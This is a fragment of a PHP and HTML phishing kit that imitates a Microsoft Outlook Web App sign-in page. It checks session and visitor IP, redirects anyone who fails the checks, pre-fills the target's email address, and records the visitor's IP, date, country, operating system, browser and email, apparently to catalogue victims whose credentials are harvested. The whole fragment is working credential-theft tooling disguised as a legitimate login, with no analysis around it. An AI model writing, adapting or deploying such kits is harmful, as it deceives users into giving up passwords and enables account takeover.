...
if($_SESSION['visitor_ip'] !== show_visitor_ip()) { $_SESSION = ''; session_destroy(); exit(header(sprintf("Location:%s", $originalurl))); }
if(!isset($_GET['replaceCurrent']) || empty($_GET['replaceCurrent'])) exit(header(sprintf('Location:%s','login.php?c='.$_SESSION['hsh'].'&replaceCurrent=1&url='.encodeDomain($_SESSION['owaemail'])))); 
if(!isset($_GET['url']) || empty($_GET['url']) || (urlencode($_GET['url']) !== encodeDomain($_SESSION['owaemail']))) exit(header(sprintf('Location:%s','login.php?c='.$_SESSION['hsh'].'&replaceCurrent=1&url='.encodeDomain($_SESSION['owaemail'])))); 
if(!isset($_SESSION['csrftoken']) || !isset($_SESSION['owaemail']) || !isset($_SESSION['hsh']) || ($_SESSION['hsh'] !== $_GET['c'])) { $_SESSION = ''; session_destroy(); exit(header(sprintf("Location:%s", $originalurl))); }
$email = $_SESSION['owaemail'];

$error = (isset($_SESSION['error']) && !empty($_SESSION['error'])) ? $_SESSION['error'] : '';

$details = $_SESSION['visitor_ip'].' | '.$dateNow.' | '.show_visitor_locationByIp('countryName').' | '.getOs().' | '.getBrowser().' | '.$_SESSION['owaemail'];
...
@font-face {
    ...
    src: url("resources/segoeui-regular.eot?#iefix") format("embedded-opentype"),
            url("resources/segoeui-regular.ttf") format("truetype");
}

@font-face {
    font-family: "wf_segoe-ui_semilight";
    src: url("resources/segoeui-semilight.eot?#iefix") format("embedded-opentype"),
        url("resources/segoeui-semilight.ttf") format("truetype");
}

@font-face {
    font-family: "wf_segoe-ui_semibold";
    src: url("resources/segoeui-semibold.eot?#iefix") format("embedded-opentype"),
        url("resources/segoeui-semibold.ttf") format("truetype");
}
</style>
...
<div id="mainLogonDiv" class="mouse">
	...
	<div id="lgnDiv" class="logonDiv" onkeypress="return checkSubmit(event)">
		...
		<div><input id="username" name="username" readonly class="signInInputText" value="<?php if($autograbemail == "yes") echo $email; ?>" role="textbox" aria-labelledby="userNameLabel"></div>
		...
		<div class="signInEnter">
            ...
            <input name="send" value="submit" type="hidden">
		</div>
